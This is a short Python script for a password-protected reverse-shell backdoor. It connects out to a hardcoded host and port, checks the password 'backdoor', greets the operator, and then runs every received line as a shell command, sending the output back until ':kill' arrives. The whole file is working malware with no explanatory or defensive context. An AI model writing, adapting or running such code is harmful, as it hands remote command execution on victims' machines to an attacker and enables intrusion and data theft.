import subprocess
import socket
host ="127.0.0.1"
port = 4444
passwd = "backdoor"
kill =":kill"

def Login():
        global s
        s.send(bytes("Login: ","utf-8"))
        pwd1 = s.recv(1024)
        pwd =(pwd1.decode("utf-8"))
        if pwd.strip() != passwd :
         Login()
        else:
         s.send(bytes("wellcome MR.X ,you hava a shell","utf-8"))
         Shell()
def Shell():
        while True:
                data1 = s.recv(1024)
                data =(data1.decode("utf-8"))
                if data.strip() == kill :
                 break

                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output)
                s.send(bytes("$PD$ ","utf-8"))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

Login()
